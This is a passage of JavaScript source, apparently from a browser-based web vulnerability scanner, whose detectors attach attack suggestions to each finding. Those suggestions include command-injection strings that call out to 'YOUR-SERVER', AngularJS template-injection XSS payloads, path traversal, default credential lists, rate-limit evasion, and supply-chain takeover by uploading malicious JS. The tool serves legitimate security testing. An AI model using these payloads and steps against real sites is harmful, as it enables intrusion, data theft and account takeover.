            `• Newline: ${key}=%0Aid  |  ${key}=%0a%0dwhoami\n` +
            `• Time: ${key}=;sleep+5  |  ${key}=||sleep+5\n` +
            `• Blind OOB: ${key}=;curl+YOUR-SERVER  |  ${key}=;nslookup+BURP-COLLAB\n` +
            `• Windows: ${key}=&timeout+/t+5  |  ${key}=|ping+-c+1+YOUR-SERVER\n` +
            `• Bypass: ${key}=;{id,}  |  ${key}=;$IFS'id'  |  ${key}=;$(id)`
        });
      }
    }

    // P5F: only treat command-output patterns as a finding when the page ALSO exposes an
    // injectable command surface (a cmd-style param or input). Otherwise `uid=0(root)` etc. is
    // almost always example/tutorial text (rife on security-education sites) — not evidence of
    // execution — and this fired a false CRITICAL on every such page.
    const cmdiSurface = params.some(([k]) => cmdiParams.includes(k.toLowerCase())) ||
      (ctx.forms || []).some(f => [...f.querySelectorAll("input,textarea")].some(el => cmdiParams.includes((el.name || "").toLowerCase())));
    for (const pattern of (cmdiSurface ? cmdOutputPatterns : [])) {
      if (pattern.test(html)) {
        findings.push({
          type: "CMDi — Command Output Detected",
          severity: "critical",
          detail: `Command output pattern found: ${(html.match(pattern)?.[0] || "").slice(0, 80)}`,
          location: url,
          category: "command-injection",
          subtype: "output-detected",
          suggestion: "Page contains OS command output — confirmed execution context.\n• ;id  |  |whoami  |  `id`  |  $(id)\n• Escalate: reverse shell, file read"
        });
        break;
      }
    }

    const forms = ctx.forms;
    forms.forEach((form, i) => {
      const inputs = form.querySelectorAll("input, textarea");
      const cmdiInputRe = /^(cmd|exec|command|execute|run|shell|system|ping|host|ip|domain|dig|nslookup|traceroute|filename|filepath|path|dir|target|address|hostname|port|timeout|daemon|curl|wget|ftp|ssh|nc|nmap)$/i;
      for (const input of inputs) {
        const rawName = input.name || input.id || "";
        if (aspnetIgnore.test(rawName)) continue;
        const name = rawName.toLowerCase();
        if (SAFE_FORM_FIELDS.has(name)) continue;
        if (cmdiInputRe.test(name)) {
          findings.push({
            type: "CMDi — Form Input Vector",
            severity: "high",
            detail: `Form #${i+1} input "${input.name||input.id}" — CMDi vector`,
            location: form.action || url,
            category: "command-injection",
            subtype: "form-input",
            suggestion: `CMDi via form input "${input.name||input.id}":\n• ;id  |  |whoami  |  \`id\`\n• Time: ;sleep 5\n• Blind: ;curl YOUR-SERVER`
          });
        }
      }
    });

    const shellErrors = [
      /sh:\s+\d+:\s+\w+:\s+not found/i,
      /\/bin\/sh:\s/i,
      /bash:\s+.*:\s+command not found/i,
      /cannot execute binary file/i,
      /Permission denied.*\/bin\//i,
      /syntax error near unexpected token/i,
    ];
    for (const pattern of shellErrors) {
      if (pattern.test(html)) {
        findings.push({
          type: "CMDi — Shell Error Leaked",
          severity: "critical",
          detail: `Shell error: ${(html.match(pattern)?.[0] || "").slice(0, 80)}`,
          location: url,
          category: "command-injection",
          subtype: "shell-error",
          suggestion: "Shell error confirms command execution context. Adjust payload syntax."
        });
        break;
      }
    }

    return findings;
  }


  // ── 32. Response Manipulation Detection ──

  function detectResponseManipulation(ctx) {
    const findings = [];
    const url = ctx.url;
    const html = ctx.html.slice(0, 100000);
    const parsed = new URL(url);

    const accessDeniedPatterns = [
      /access\s+denied/i, /403\s+forbidden/i, /401\s+unauthorized/i,
      /permission\s+denied/i, /not\s+authorized/i, /login\s+required/i,
      /insufficient\s+privileges/i, /you\s+do\s+not\s+have\s+permission/i,
      /unauthorized\s+access/i, /authentication\s+required/i,
    ];

    const matched = accessDeniedPatterns.filter(p => p.test(html));
    // P5F: only a lead when this looks like an ACTUAL denial RESPONSE (denial in the title, or
    // a short body), not a content article that merely discusses access control (which fired a
    // false HIGH on every such page). Downgraded to an INFO lead.
    const deniedInTitle = /denied|forbidden|unauthori|not authorized|permission|login required|\b40[13]\b/i.test((typeof document !== "undefined" && document.title) || "");
    if (matched.length > 0 && (deniedInTitle || html.length < 8000)) {
      findings.push({
        type: "Auth Bypass — Response Manipulation (lead)",
        severity: "info",
        detail: `This page looks like an access-denied response — IF the check is enforced only client-side/in the response, try intercepting and flipping it. Unconfirmed.`,
        location: url, category: "auth-bypass",
        suggestion: `Intercept response in Burp → Change status 403/401 to 200/302 → Check if content loads\n• Change response body: false→true, 0→1, no→yes\n• Modify JSON: {"authorized":false} → {"authorized":true}\n• Remove the entire auth check block from response\n• Header tricks:\n  X-Forwarded-For: 127.0.0.1\n  X-Originating-IP: 127.0.0.1\n  X-Custom-IP-Authorization: 127.0.0.1\n  X-Original-URL: /admin\n  X-Rewrite-URL: /admin`
      });
    }

    const boolFlags = ["verified", "is_admin", "isAdmin", "admin", "auth", "authorized", "confirmed", "approved", "active", "enabled"];
    for (const [key, value] of parsed.searchParams) {
      if (boolFlags.includes(key) && /^(false|0|no)$/i.test(value)) {
        findings.push({
          type: "Auth Bypass — Boolean Parameter",
          severity: "high",
          detail: `Parameter "${key}=${value}" — flip to bypass authorization`,
          location: url, category: "auth-bypass",
          suggestion: `Change ${key}=${value} to:\n• ${key}=true\n• ${key}=1\n• ${key}=yes\n• ${key}=admin\nAlso try removing the parameter entirely or adding it to requests that don't have it`
        });
      }
    }

    return findings;
  }

  // ── 33. Parameter Discovery ──

  function discoverParameters(ctx) {
    const findings = [];
    const url = ctx.url;
    const parsed = new URL(url);
    const collected = { url: [], form: [], js: [], data: [] };

    for (const k of parsed.searchParams.keys()) collected.url.push(k);

    const formEls = document.querySelectorAll("input[name], select[name], textarea[name]");
    const seen = new Set();
    for (const el of formEls) {
      const n = el.getAttribute("name");
      if (n && !seen.has(n)) { seen.add(n); collected.form.push(n); }
    }

    const scripts = ctx.inlineScripts.map(s => s.textContent).join("\n").slice(0, 150000);
    const jsPatterns = [
      /searchParams\.get\(\s*['"]([^'"]+)['"]\s*\)/g,
      /req\.(?:query|body|params)\.(\w+)/g,
      /params\.(\w+)/g,
      /\bURLSearchParams\b[^)]*['"](\w+)['"]/g,
    ];
    const jsParams = new Set();
    for (const pat of jsPatterns) {
      let m;
      while ((m = pat.exec(scripts)) !== null) jsParams.add(m[1]);
    }
    collected.js = [...jsParams];

    const dataEls = document.querySelectorAll("[data-id], [data-user], [data-token], [data-api], [data-key], [data-url], [data-endpoint], [data-action], [data-role], [data-type]");
    const dataSet = new Set();
    for (const el of dataEls) {
      for (const attr of el.attributes) {
        if (attr.name.startsWith("data-")) dataSet.add(attr.name);
      }
    }
    collected.data = [...dataSet];

    const all = new Set([...collected.url, ...collected.form, ...collected.js, ...collected.data]);
    if (all.size > 3) {
      const parts = [];
      if (collected.url.length) parts.push(`URL: ${collected.url.join(", ")}`);
      if (collected.form.length) parts.push(`Forms: ${collected.form.slice(0, 15).join(", ")}${collected.form.length > 15 ? "..." : ""}`);
      if (collected.js.length) parts.push(`JS: ${collected.js.slice(0, 10).join(", ")}${collected.js.length > 10 ? "..." : ""}`);
      if (collected.data.length) parts.push(`Data attrs: ${collected.data.slice(0, 10).join(", ")}`);

      findings.push({
        type: "Recon — Parameter Map",
        severity: "info",
        detail: `${all.size} params discovered | ${parts.join(" | ")}`,
        location: url, category: "recon",
        suggestion: `Test each parameter for injection:\n• SQLi: param=value'\n• XSS: param=<script>alert(1)</script>\n• IDOR: change numeric values\n• SSRF: param=http://127.0.0.1\n• Add hidden params: try ?debug=1, ?admin=true, ?test=1, ?source=1, ?_debug=1`
      });
    }

    return findings;
  }

  // ── 34. Keyword Scanner ──

  function scanKeywords(ctx) {
    const findings = [];
    const url = ctx.url;
    // P5F/P6: match ONLY against real URLs/paths (this page's URL, link hrefs, script/asset
    // srcs) — never free page text or article prose. A security site mentioning "oauth" or
    // "api_key" in an article is not a finding. The scary keyword findings ("API Key
    // Reference" HIGH on the word api_key, "Config Reference", "Cloud Service") are removed —
    // the secrets/config detectors already flag ACTUAL leaks by value pattern. What remains is
    // low-noise recon at INFO and an open-redirect lead, both gated on real endpoint URLs.
    const links = [...document.querySelectorAll("a[href]")].map(a => a.getAttribute("href") || "");
    const srcs = [...document.querySelectorAll("script[src],link[href]")].map(el => el.getAttribute("src") || el.getAttribute("href") || "");
    const urlSpace = [url, ...links, ...srcs].join(" ");

    const endpointKeywords = [
      { re: /\/(?:oauth|openid|connect\/authorize|saml)(?:[\/?]|$)/i, name: "OAuth/SSO endpoint", detail: "An OAuth/SSO endpoint is referenced — if you exercise the flow, check state and redirect_uri handling." },
      { re: /\/(?:swagger|openapi|api-docs|v\d+\/docs)(?:[\/?]|$)/i, name: "API documentation endpoint", detail: "An API docs endpoint is referenced — enumerate the documented API surface." },
    ];
    for (const kw of endpointKeywords) {
      if (kw.re.test(urlSpace)) {
        findings.push({ type: `Recon — ${kw.name}`, severity: "info", detail: kw.detail, location: url, category: "recon" });
      }
    }

    // P1: check only THIS page's own URL for a redirect parameter — not every link href on
    // the page (which includes the shared nav/footer, making it fire on every route).
    const redirectParams = /[?&](redirect|return|next|goto|continue|url|uri|callback|return_url|redirect_uri|return_to|forward|dest|destination|rurl|target_url)=/i;
    if (redirectParams.test(url)) {
      const match = url.match(redirectParams);
      findings.push({
        type: "Open Redirect — Parameter (lead)",
        severity: "info",
        detail: `A redirect parameter "${match?.[1] || "redirect"}" is present — test whether it accepts an external URL. Unconfirmed.`,
        location: url, category: "open-redirect",
        suggestion: `Test payloads on the redirect parameter:\n• //evil.example  |  https://evil.example  |  /\\evil.example\nIf an OAuth flow uses it as redirect_uri, escalate to authorization-code/token theft.`
      });
    }

    return findings;
  }

  // ── 35. Hidden Parameter Discovery ──

  function discoverHiddenParams(ctx) {
    const findings = [];
    const html = ctx.html.slice(0, 150000);
    const url = ctx.url;

    const commentRe = /<!--([\s\S]*?)-->/g;
    const sensitiveKeys = /\b(token|api[_-]?key|secret|password|passwd|pwd|hash|nonce|csrf|session|auth|bearer|credential|private[_-]?key|access[_-]?key)\b/i;
    const commentFindings = [];
    let cm;
    while ((cm = commentRe.exec(html)) !== null) {
      const body = cm[1];
      if (sensitiveKeys.test(body)) {
        const match = body.match(sensitiveKeys);
        commentFindings.push(match ? match[0] : "sensitive");
      }
    }

    const scripts = ctx.inlineScripts.map(s => s.textContent).join("\n").slice(0, 150000);
    const jsObjKeys = /["']?(admin|role|debug|internal|test|is_admin|isAdmin|is_staff|superuser|privileged|canEdit|canDelete|canAdmin|feature_flag|ff_|experiment)["']?\s*:/gi;
    const jsHits = new Set();
    let jm;
    while ((jm = jsObjKeys.exec(scripts)) !== null) jsHits.add(jm[1]);

    const items = [...new Set([...commentFindings, ...jsHits])];
    if (items.length > 0) {
      findings.push({
        type: "Recon — Hidden Parameters",
        severity: "medium",
        detail: `Found ${items.length} hidden/internal param(s): ${items.slice(0, 15).join(", ")}`,
        location: url, category: "recon",
        suggestion: `Hidden parameters found in comments or JS objects.\n• Inject these as URL params: ?${items[0]}=true&debug=1\n• Add to POST body or JSON request\n• Check if they toggle privileged behavior\n• Look for feature flags that enable unreleased/debug functionality`
      });
    }

    return findings;
  }

  // ── 36. AngularJS / Framework Template Injection ──

  function detectAngularInjection(ctx) {
    const findings = [];
    const url = ctx.url;
    const html = ctx.html.slice(0, 100000);
    const scriptSrcs = [...document.querySelectorAll("script[src]")].map(s => s.src);

    const hasNgApp = document.querySelector("[ng-app], [data-ng-app], [ng-controller], [data-ng-controller], [ng-model]");
    const angularScript = scriptSrcs.find(s => /angular[._-]?\d|angular\.(?:min\.)?js/i.test(s));
    const isAngular = hasNgApp || angularScript || /angular\.module\s*\(|ng-app/i.test(html);

    if (isAngular) {
      let version = null;
      if (angularScript) {
        const vm = angularScript.match(/angular[._-]?(\d+)[._-](\d+)[._-](\d+)/i);
        if (vm) version = `${vm[1]}.${vm[2]}.${vm[3]}`;
      }
      if (!version) {
        const htmlVm = html.match(/AngularJS\s+v?(\d+\.\d+\.\d+)/i);
        if (htmlVm) version = htmlVm[1];
      }

      const isVulnerable = version && parseFloat(version) < 1.8;

      findings.push({
        type: "Technology — AngularJS Detected",
        severity: isVulnerable ? "high" : "info",
        detail: `AngularJS ${version || "(version unknown)"} detected${isVulnerable ? " — template injection possible" : ""}`,
        location: url, category: "recon",
      });

      if (isVulnerable) {
        findings.push({
          type: "XSS — AngularJS Template Injection",
          severity: "high",
          detail: `AngularJS ${version} is vulnerable to client-side template injection via {{expression}} syntax`,
          location: url, category: "xss", subtype: "template-injection",
          suggestion: `AngularJS ${version} template injection payloads:\n• {{constructor.constructor('alert(1)')()}}\n• {{$on.constructor('alert(1)')()}}\n• {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}  \n• {{$eval.constructor('alert(1)')()}}\n• Inject in any user-reflected input — AngularJS evaluates {{}} in templates\n• Bypass sandbox (pre-1.6): {{'a'['constructor']['prototype']['charAt']=[]['join'];$eval('x=alert(1)');}}\n• CSP bypass via AngularJS: <script src="angular.js"></script><div ng-app>{{$eval.constructor('alert(1)')()}}</div>`
        });
      }
    }

    let vueAttrs = null;
    try { vueAttrs = document.querySelector("[v-bind], [v-model], [v-on]"); } catch {}
    if (!vueAttrs) vueAttrs = !!ctx.html.match(/:click=|@click=|v-for=/i);
    const vueScript = scriptSrcs.find(s => /vue[._-]?\d|vue\.(?:min\.)?js/i.test(s)) || /Vue\s*\.\s*(?:createApp|component|use)/i.test(html);
    if (vueAttrs || vueScript) {
      findings.push({
        type: "Technology — Vue.js Detected",
        severity: "info",
        detail: "Vue.js framework detected — test for client-side template injection in v-html or unescaped bindings",
        location: url, category: "recon",
      });
    }

    const reactIndicators = /dangerouslySetInnerHTML|ReactDOM\.render|react-root|__NEXT_DATA__|__NUXT__/i.test(html);
    const reactScript = scriptSrcs.find(s => /react[._-]?\d|react\.(?:min\.)?js|react-dom/i.test(s));
    if (reactIndicators || reactScript) {
      const hasDangerous = /dangerouslySetInnerHTML/i.test(html);
      findings.push({
        type: "Technology — React Detected",
        severity: hasDangerous ? "medium" : "info",
        detail: `React framework detected${hasDangerous ? " — dangerouslySetInnerHTML in use (XSS risk)" : ""}`,
        location: url, category: "recon",
      });
    }

    return findings;
  }

  function detectPageChanges(ctx) {
    const findings = [];
    const url = ctx.url;
    const html = ctx.html;
    const formCount = ctx.forms.length;
    const inputCount = document.querySelectorAll("input, textarea, select").length;
    const linkCount = document.querySelectorAll("a[href]").length;
    const scriptCount = document.querySelectorAll("script").length;
    const commentMatches = html.match(/<!--[\s\S]*?-->/g) || [];
    const hiddenCount = document.querySelectorAll('input[type="hidden"]').length;
    const fingerprint = {
      url: url.split("?")[0],
      forms: formCount,
      inputs: inputCount,
      links: linkCount,
      scripts: scriptCount,
      comments: commentMatches.length,
      hidden: hiddenCount,
      size: html.length,
    };
    try {
      const key = "bhp_page_fp_" + fingerprint.url;
      const prev = localStorage.getItem(key);
      if (prev) {
        const old = JSON.parse(prev);
        const changes = [];
        if (old.forms !== fingerprint.forms) changes.push(`forms: ${old.forms}→${fingerprint.forms}`);
        if (old.inputs !== fingerprint.inputs) changes.push(`inputs: ${old.inputs}→${fingerprint.inputs}`);
        if (old.hidden !== fingerprint.hidden) changes.push(`hidden: ${old.hidden}→${fingerprint.hidden}`);
        if (old.scripts !== fingerprint.scripts) changes.push(`scripts: ${old.scripts}→${fingerprint.scripts}`);
        if (Math.abs(old.size - fingerprint.size) > 500) changes.push(`size: ${old.size}→${fingerprint.size}`);
        if (changes.length > 0) {
          findings.push({
            type: "Recon — Page Change Detected",
            severity: "info",
            detail: `Page structure changed since last visit: ${changes.join(", ")}`,
            location: url, category: "recon",
            suggestion: "Page structure changed — new forms/inputs may introduce new attack surface. Re-scan thoroughly."
          });
        }
      }
      localStorage.setItem(key, JSON.stringify(fingerprint));
    } catch {}
    return findings;
  }

  // ── 38. GitHub/GitLab Repo Takeover Detection (#21) ──

  function detectRepoTakeover(ctx) {
    const findings = [];
    const links = document.querySelectorAll("a[href]");
    const repoHosts = /^https?:\/\/(github\.com|gitlab\.com|bitbucket\.org)\//i;
    const seen = new Set();
    for (const link of links) {
      const href = link.getAttribute("href") || "";
      if (!repoHosts.test(href) || seen.has(href)) continue;
      seen.add(href);
      const m = href.match(/https?:\/\/(github\.com|gitlab\.com|bitbucket\.org)\/([^/]+)\/([^/?#]+)/i);
      if (m) {
        findings.push({
          type: "Recon — Repository Link",
          severity: "medium",
          detail: `External repo link: ${m[1]}/${m[2]}/${m[3]} — check if repo exists or has been deleted/renamed`,
          location: href,
          category: "recon",
          suggestion: `Repository takeover detection:\n• Visit ${href} — if 404, the repo/org may be claimable\n• Org takeover: if ${m[2]} org doesn't exist, create it to control package imports\n• Check if app pulls dependencies from this repo\n• GitHub: check for repo renames (old name may be claimable)\n• Package manager takeover: if npm/pip/gem package name references this repo and repo is deleted\n• Check git submodules, CI configs, import statements referencing this URL`
        });
      }
    }
    const scripts = [...document.querySelectorAll("script[src]")].map(s => s.src);
    for (const src of scripts) {
      if (repoHosts.test(src) || /raw\.githubusercontent\.com|cdn\.jsdelivr\.net\/gh/i.test(src)) {
        findings.push({
          type: "Takeover — Script from Repository",
          severity: "high",
          detail: `Script loaded from git repo: ${truncate(src, 80)} — if repo is deleted, attacker can recreate it`,
          location: src,
          category: "info-disclosure",
          suggestion: `Supply chain takeover:\n• If the GitHub/GitLab repo is deleted, claim the username+repo name\n• Upload malicious JS to execute XSS on all sites loading this script\n• Check: does the repo still exist? Is the user account still active?`
        });
      }
    }
    return findings;
  }

  // ── 39. OAuth State Parameter Check (#22) ──

  function detectOAuthState(ctx) {
    const findings = [];
    const url = ctx.url;
    const parsed = new URL(url);
    const html = ctx.html.slice(0, 100000);
    const isOAuthEndpoint = /oauth|authorize|auth\/callback|login\/callback|\.auth\.|openid|connect\/authorize/i.test(url);
    const hasOAuthParams = parsed.searchParams.has("client_id") || parsed.searchParams.has("response_type") || parsed.searchParams.has("redirect_uri");
    if (isOAuthEndpoint || hasOAuthParams) {
      if (!parsed.searchParams.has("state")) {
        findings.push({
          type: "OAuth — Missing State Parameter",
          severity: "high",
          detail: "OAuth authorization endpoint without 'state' parameter — vulnerable to CSRF on login",
          location: url,
          category: "csrf",
          subtype: "oauth-csrf",
          suggestion: `OAuth CSRF (missing state):\n• Attacker initiates OAuth flow, gets authorization code\n• Attacker sends code URL to victim → victim logs into attacker's account\n• Victim's actions (saved cards, linked accounts) now belong to attacker\n• Also test: state parameter present but not validated (static value, predictable)\n• Chain: OAuth CSRF → stored XSS in attacker account → steal victim session`
        });
      }
      const state = parsed.searchParams.get("state");
      if (state && state.length < 8) {
        findings.push({
          type: "OAuth — Weak State Parameter",
          severity: "medium",
          detail: `OAuth state parameter is only ${state.length} chars: "${state}" — may be predictable`,
          location: url,
          category: "csrf",
          subtype: "oauth-csrf",
          suggestion: "Short state = potentially brute-forceable. Test if state is validated server-side by replaying with modified state value."
        });
      }
    }
    const oauthLinks = [...document.querySelectorAll("a[href]")].filter(a => /oauth|authorize|login.*google|login.*facebook|login.*github|signin.*microsoft|auth.*callback/i.test(a.href));
    for (const link of oauthLinks) {
      try {
        const lp = new URL(link.href);
        if (!lp.searchParams.has("state")) {
          findings.push({
            type: "OAuth — Login Link Missing State",
            severity: "medium",
            detail: `OAuth login link without state parameter: ${truncate(link.href, 80)}`,
            location: link.href,
            category: "csrf",
            subtype: "oauth-csrf",
            suggestion: "OAuth login link lacks CSRF protection. Generate and validate a unique state parameter per session."
          });
        }
      } catch {}
    }
    return findings;
  }

  // ── 40. IDOR via Filename Pattern Detection (#23) ──

  function detectIDORFilename(ctx) {
    const findings = [];
    const url = ctx.url;
    const html = ctx.html.slice(0, 100000);
    const fileLinks = [...document.querySelectorAll("a[href]")].filter(a => /download|file|attachment|doc|document|export|report|invoice|receipt|statement|pdf|csv/i.test(a.href));
    const filePatternRe = /\/(?:files?|downloads?|attachments?|documents?|exports?|reports?|invoices?)\/([\w-]+)\/([\w.-]+)/i;
    for (const link of fileLinks) {
      const href = link.getAttribute("href") || "";
      const m = href.match(filePatternRe);
      if (m) {
        findings.push({
          type: "IDOR — File Download Pattern",
          severity: "high",
          detail: `File download with user/ID prefix: ${truncate(href, 80)} — change ID to access other users' files`,
          location: href,
          category: "auth-bypass",
          suggestion: `File download IDOR:\n• Change user/ID prefix: /${m[1]}/ → try other user IDs\n• Enumerate: if numeric, try ±1, ±10, 0, 1\n• Remove auth cookie and try direct access\n• Try path traversal in filename: ../../../etc/passwd\n• Check if file listing exists: remove filename from URL\n• Mass download: Burp Intruder on the ID segment`
        });
      }
    }
    const fileParams = [...new URL(url).searchParams.entries()].filter(([k]) => /file|filename|path|doc|document|attachment|download|name/i.test(k));
    for (const [key, value] of fileParams) {
      if (/\d+[_-]/.test(value) || /user\d+/i.test(value) || /\/\d+\//i.test(value)) {
        findings.push({
          type: "IDOR — Filename with User Prefix",
          severity: "high",
          detail: `File parameter "${key}"="${truncate(value, 60)}" contains user/ID prefix`,
          location: url,
          category: "auth-bypass",
          suggestion: `IDOR via filename:\n• Change the numeric prefix: ${key}=${value.replace(/\d+/, 'OTHER_ID')}\n• Try: ${key}=../../../etc/passwd (path traversal)\n• Remove all ID prefixes: ${key}=${value.replace(/^\d+[_-]/, '')}\n• Add ?user_id=OTHER to request`
        });
      }
    }
    return findings;
  }

  // ── 41. Duplicate Account Takeover Detection (#25) ──

  function detectDuplicateAccount(ctx) {
    const findings = [];
    const url = ctx.url;
    const forms = ctx.forms;
    for (const form of forms) {
      const inputs = [...form.querySelectorAll("input")];
      const hasEmail = inputs.some(i => /email/i.test(i.name || i.type || i.id));
      const hasPassword = inputs.some(i => /password|passwd|pwd/i.test(i.name || i.type || i.id));
      const hasUsername = inputs.some(i => /user|username|login/i.test(i.name || i.id));
      const isRegistration = /register|signup|sign.?up|create.*account|join/i.test((form.action || "") + " " + (form.id || "") + " " + (form.className || "") + " " + url);
      if (isRegistration && hasEmail && hasPassword) {
        findings.push({
          type: "Business Logic — Duplicate Account Takeover",
          severity: "high",
          detail: `Registration form detected — test duplicate email registration for account takeover`,
          location: form.action || url,
          category: "auth-bypass",
          suggestion: `Duplicate account takeover techniques:\n• Register with existing user's email → does it overwrite their password?\n• Case variation: User@email.com vs user@email.com\n• +alias: user+test@email.com vs user@email.com\n• Dots (Gmail): u.ser@gmail.com vs user@gmail.com\n• Unicode: üser@email.com vs user@email.com\n• Trailing spaces: "user@email.com " (with space)\n• Different auth provider: register with email that's already OAuth-linked\n• Race condition: register same email simultaneously from 2 sessions\n• If username-based: register with existing username + different email → hijack?`
        });
      }
      if (hasUsername && hasEmail && hasPassword && !isRegistration) {
        const isPasswordReset = /reset|forgot|recover|change.*pass/i.test((form.action || "") + " " + url);
        if (isPasswordReset) {
          findings.push({
            type: "Business Logic — Password Reset",
            severity: "medium",
            detail: `Password reset form — test for account takeover via token manipulation`,
            location: form.action || url,
            category: "auth-bypass",
            suggestion: `Password reset attacks:\n• Try resetting another user's password with your token\n• Reuse expired reset tokens\n• Modify email parameter in reset request\n• Host header poisoning: set Host to attacker.com → reset link points to attacker\n• Test rate limiting on reset endpoint`
          });
        }
      }
    }
    return findings;
  }

  // ── 42. Rate Limiting Detection (#35) ──

  function detectRateLimiting(ctx) {
    const findings = [];
    const url = ctx.url;
    const forms = ctx.forms;
    for (const form of forms) {
      const method = (form.getAttribute("method") || "GET").toUpperCase();
      if (method !== "POST") continue;
      const inputs = [...form.querySelectorAll("input, textarea, select")];
      const inputNames = inputs.map(el => (el.name || el.id || "").toLowerCase()).filter(Boolean);
      const hasCaptcha = form.querySelector('[class*="captcha"], [id*="captcha"], [name*="captcha"], [class*="recaptcha"], [data-sitekey], .g-recaptcha, .h-captcha, [class*="hcaptcha"], [class*="turnstile"]');
      const hasRateIndicator = form.querySelector('[class*="cooldown"], [class*="throttle"], [disabled][data-countdown]');
      const isLogin = inputNames.some(n => /user|email|login/i.test(n)) && inputNames.some(n => /pass|pwd/i.test(n));
      const isPayment = inputNames.some(n => /amount|transfer|payment|card|credit|debit/i.test(n));
      const isSensitive = inputNames.some(n => /password|email|phone|delete|coupon|code|otp|pin|mfa|2fa|gift|promo|voucher|redeem/i.test(n));
      if (!hasCaptcha && !hasRateIndicator && (isLogin || isPayment || isSensitive)) {
        const formType = isLogin ? "Login" : isPayment ? "Payment" : "Sensitive";
        findings.push({
          type: `Rate Limit — ${formType} Form Without Protection`,
          severity: isLogin ? "high" : "medium",
          detail: `${formType} form lacks CAPTCHA/rate limiting — brute-force/abuse possible [fields: ${inputNames.slice(0, 5).join(", ")}]`,
          location: form.action || url,
          category: "auth-bypass",
          suggestion: `Rate limiting bypass techniques:\n• Brute-force: no CAPTCHA means automated attacks possible\n• IP rotation: use multiple IPs/proxies\n• Header manipulation: X-Forwarded-For, X-Real-IP, X-Originating-IP with different values per request\n• Case variation: email/username with different casing per attempt\n• Null bytes: add %00 to username to bypass per-account limits\n• API endpoint: try /api/v1/login instead of form — may have separate rate limits\n• Race condition: send 100+ requests simultaneously\n${isLogin ? "• Credential stuffing: use breach databases\n• Password spraying: one password across many usernames" : ""}${isPayment ? "• Coupon/promo code brute-force\n• Multiple small transactions to evade monitoring" : ""}`
        });
      }
    }
    return findings;
  }

  // ── 43. Default Credentials Scanner (#36) ──

  function detectDefaultCreds(ctx) {
    const findings = [];
    const url = ctx.url;
    const html = ctx.html.slice(0, 100000);
    const currentPath = new URL(url).pathname.toLowerCase();
    const adminPaths = ["/admin", "/administrator", "/wp-admin", "/wp-login", "/login", "/panel", "/control", "/dashboard", "/manage", "/console", "/phpmyadmin", "/adminer", "/cpanel", "/webmail", "/grafana", "/jenkins", "/kibana", "/portainer", "/nagios", "/zabbix", "/tomcat", "/manager"];
    const isAdminPanel = adminPaths.some(p => currentPath.startsWith(p));
    const hasLoginForm = document.querySelector("form") && document.querySelector('input[type="password"]');
    if (isAdminPanel && hasLoginForm) {
      const techHints = [];
      if (/wordpress|wp-content/i.test(html)) techHints.push("WordPress: admin/admin, admin/password");
      if (/joomla/i.test(html)) techHints.push("Joomla: admin/admin");
      if (/drupal/i.test(html)) techHints.push("Drupal: admin/admin");
      if (/tomcat/i.test(html) || currentPath.includes("/manager")) techHints.push("Tomcat: tomcat/tomcat, admin/admin, manager/manager, tomcat/s3cret");
      if (/jenkins/i.test(html)) techHints.push("Jenkins: admin/admin (initial setup)");
      if (/grafana/i.test(html)) techHints.push("Grafana: admin/admin");
      if (/kibana|elastic/i.test(html)) techHints.push("Elasticsearch: elastic/changeme");
      if (/phpmyadmin/i.test(html) || currentPath.includes("phpmyadmin")) techHints.push("phpMyAdmin: root/(empty), root/root");
      if (/nagios/i.test(html)) techHints.push("Nagios: nagiosadmin/nagios");
      if (/zabbix/i.test(html)) techHints.push("Zabbix: Admin/zabbix");
      if (/portainer/i.test(html)) techHints.push("Portainer: admin/admin (first setup)");
      const defaultList = techHints.length > 0 ? techHints.join("\n• ") : "admin/admin, admin/password, admin/123456, root/root, root/toor, test/test, guest/guest";
      findings.push({
        type: "Default Credentials — Admin Panel",
        severity: "high",
        detail: `Admin login panel at ${currentPath} — test default credentials`,
        location: url,
        category: "auth-bypass",
        suggestion: `Default credentials to test:\n• ${defaultList}\n\nGeneric defaults:\n• admin/admin, admin/password, admin/123456\n• root/root, root/toor, root/password\n• test/test, user/user, guest/guest\n• administrator/administrator\n• demo/demo, operator/operator\n\nTools: Burp Intruder with SecLists default-credentials list\nAlso try: blank password, username as password, company name as password`
      });
    }
    return findings;
  }

  // ── 44. Session Management Audit (#37) ──

  function detectSessionAudit(ctx) {
    const findings = [];
    const url = ctx.url;
    const cookies = ctx.cookies;
    const sessionCookies = cookies.split(";").filter(c => /session|sess|sid|token|auth|jwt|access/i.test(c.split("=")[0]));
    for (const sc of sessionCookies) {
      const [name, ...valueParts] = sc.trim().split("=");
      const value = valueParts.join("=");
      if (value && value.length < 16 && !/^eyJ/.test(value)) {
        findings.push({
          type: "Session — Low Entropy Token",
          severity: "high",
          detail: `Session cookie "${name.trim()}" has only ${value.length} chars — potentially brute-forceable`,
          location: "Cookies",
          category: "auth-bypass",
          suggestion: `Low entropy session token:\n• Token "${name.trim()}" is ${value.length} chars — may be predictable\n• Test: can you enumerate valid sessions?\n• Check if token is sequential (get 2 sessions, compare)\n• Recommended: session tokens should be ≥128 bits of entropy (32+ hex chars)`
        });
      }
      if (/^\d+$/.test(value) && value.length <= 8) {
        findings.push({
          type: "Session — Numeric Token",
          severity: "high",
          detail: `Session cookie "${name.trim()}" is purely numeric: ${value} — trivially enumerable`,
          location: "Cookies",
          category: "auth-bypass",
          suggestion: `Numeric session ID = trivially enumerable:\n• Brute-force range: 0 to ${Math.pow(10, value.length)}\n• Sequential prediction: try ±1, ±10\n• This is a critical finding — report immediately`
        });
      }
    }
    if (sessionCookies.length > 0) {
      findings.push({
        type: "Session — Fixation Test",
        severity: "medium",
        detail: `${sessionCookies.length} session cookie(s) detected — test for session fixation`,
        location: "Cookies",
        category: "auth-bypass",
        suggestion: `Session fixation test:\n1. Note session ID before login\n2. Log in → does session ID change?\n3. If same ID: session fixation vulnerability\n4. Attacker sets victim's session cookie → victim logs in → attacker uses same session\n\nAlso test:\n• Session persistence after logout (does server invalidate?)\n• Session timeout (is there one?)\n• Concurrent sessions (can attacker's session survive password change?)\n• Cross-browser session validity`
      });
    }
    const logoutLink = document.querySelector('a[href*="logout"], a[href*="signout"], a[href*="sign_out"], button[class*="logout"]');
    if (logoutLink) {
      const isGetLogout = logoutLink.tagName === "A" && logoutLink.href;
      if (isGetLogout) {
        findings.push({
          type: "Session — GET-based Logout",
          severity: "low",
          detail: `Logout via GET request: ${truncate(logoutLink.href, 60)} — CSRF logout possible`,
          location: logoutLink.href || url,
          category: "csrf",
          suggestion: `GET logout = CSRF logout:\n• <img src="${logoutLink.href}"> on any page logs out the user\n• Chain: force-logout → redirect to phishing login page\n• Logout should require POST with CSRF token`
        });
      }
    }
    return findings;
